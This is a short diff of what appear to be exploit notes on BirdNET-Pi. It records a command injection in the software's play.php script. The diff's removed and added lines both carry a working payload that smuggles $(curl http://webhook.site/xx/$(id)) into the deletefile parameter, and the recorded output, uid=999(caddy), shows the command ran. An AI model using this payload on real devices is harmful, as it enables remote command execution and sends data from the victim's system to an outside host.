@@ -5,7 +5,7 @@ html:birdnet
 some nice command injection 
 https://github.com/mcguirepr89/BirdNET-Pi/blob/main/scripts/play.php
 
-play.php?deletefile=$(curl http://webhook.site/xx/$(id))&doshift=1
+play.php?deletefile=$(curl http://webhook.site/xx/$(id))
 
 uid=999(caddy)
 
